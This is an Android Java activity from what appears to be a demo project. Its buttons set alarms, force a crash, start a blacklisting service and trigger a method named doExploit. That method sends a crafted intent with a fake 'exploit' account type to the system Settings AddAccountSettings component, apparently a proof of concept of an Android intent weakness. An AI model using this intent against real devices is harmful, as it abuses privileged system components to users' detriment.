package com.metova.hackeryexamplesproject;

import android.app.Activity;
import android.app.AlarmManager;
import android.app.AlertDialog;
import android.app.PendingIntent;
import android.content.ComponentName;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import android.os.SystemClock;
import android.support.annotation.Nullable;
import android.util.AttributeSet;
import android.util.Log;
import android.view.View;
import android.widget.Button;

import java.util.Calendar;

public class ExampleActivity extends Activity {

    public static final String TAG = ExampleActivity.class.getSimpleName();
    public static final String ACTION_CRASH = "action_crash";
    public static final String EXTRA_CRASH_INFO = "extra_crash_info";

    @Override
    protected void onCreate(Bundle savedInstanceState) {

        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_example);
    }

    @Override
    protected void onStart() {

        super.onStart();

        final Button start = (Button) findViewById(R.id.start_alarm);

        start.setOnClickListener(new View.OnClickListener() {

            @Override
            public void onClick(View v) {

                setRealtimeAlarm(1000 * 60 * 5);    // set an alarm for 5 minutes from now

                Calendar calendar = Calendar.getInstance();
                calendar.setTimeInMillis(System.currentTimeMillis());
                calendar.set(Calendar.HOUR_OF_DAY, 10);
                calendar.set(Calendar.MINUTE, 0);
                setRepeatingRTCAlarm(calendar); // start an alarm at 10:00 a.m. and repeat every ~ 15 minutes
            }
        });

        final Button doExploit = (Button) findViewById(R.id.do_exploit);

        doExploit.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {

                doExploit();
            }
        });

        final Button doBlacklist = (Button) findViewById(R.id.do_blacklist);

        doBlacklist.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {

                doBlacklist();
            }
        });

        final Button doCrash = (Button) findViewById(R.id.do_crash);

        doCrash.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {

                // Force a crash
                ((String) null).length();
            }
        });

        if(getIntent() != null && ACTION_CRASH.equals(getIntent().getAction())) {

            showCrashInfo();
        }
    }

    @Override
    protected void onDestroy() {

        showCrashDialog(false);
        super.onDestroy();
    }

    private AlertDialog mCrashDialog = null;
    private void showCrashInfo() {

        showCrashDialog(true);
    }

    private void showCrashDialog(boolean show) {

        Log.d(TAG, "showCrashDialog: " + Boolean.toString(show));

        String crashMessage = getIntent().getStringExtra(EXTRA_CRASH_INFO);

        if(show) {

            if(mCrashDialog == null || !mCrashDialog.isShowing()) {

                AlertDialog.Builder builder = new AlertDialog.Builder(this);
                builder.setCancelable(false);
                builder.setTitle("Oops, something went wrong!");
                builder.setMessage("\n" + crashMessage + "\n");
                builder.setPositiveButton("OK", new DialogInterface.OnClickListener() {
                    @Override
                    public void onClick(DialogInterface dialog, int which) {

                        showCrashDialog(false);
                    }
                });

                mCrashDialog = builder.create();
                mCrashDialog.show();
            }
        }
        else {

            try {

                if(mCrashDialog != null && mCrashDialog.isShowing()) {

                    mCrashDialog.dismiss();
                }
            }
            catch (Exception e) { /* no-op */ }
            finally {

                mCrashDialog = null;
            }
        }
    }

    private void doBlacklist() {

        Intent intent = new Intent(this, ExampleBlackListing.class);
        startService(intent);
    }

    private void doExploit() {

        Intent intent = new Intent();
        intent.setComponent(new ComponentName("com.android.settings", "com.android.settings.accounts.AddAccountSettings"));
        intent.setAction(Intent.ACTION_RUN);
        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        String authTypes[] = {"exploit"};

        intent.putExtra("account_types", authTypes);
        startActivity(intent);
    }

    private void setRealtimeAlarm(int delay) {

        AlarmManager alarmManager = (AlarmManager) getSystemService(ALARM_SERVICE);

        Intent alarmIntent = new Intent(this, ExampleAlarmReceiver.class);
        PendingIntent pendingIntent = PendingIntent.getBroadcast(this, 200, alarmIntent, PendingIntent.FLAG_UPDATE_CURRENT);

        if(Build.VERSION.SDK_INT >= 19) {
            alarmManager.setExact(AlarmManager.ELAPSED_REALTIME_WAKEUP,
                    SystemClock.elapsedRealtime() + delay, pendingIntent);
        }
        else {
            alarmManager.set(AlarmManager.ELAPSED_REALTIME_WAKEUP,
                    SystemClock.elapsedRealtime() + delay, pendingIntent);
        }
    }

    private void setRepeatingRTCAlarm(Calendar calendar) {

        AlarmManager alarmManager = (AlarmManager) getSystemService(ALARM_SERVICE);

        Intent alarmIntent = new Intent(this, ExampleAlarmReceiver.class);
        PendingIntent pendingIntent = PendingIntent.getBroadcast(this, 200, alarmIntent, PendingIntent.FLAG_UPDATE_CURRENT);

        // As mentioned before as a caveat, all repeating alarms are inexact if >= API 19
        alarmManager.setInexactRepeating(AlarmManager.RTC_WAKEUP, calendar.getTimeInMillis(), AlarmManager.INTERVAL_FIFTEEN_MINUTES, pendingIntent);
    }
}
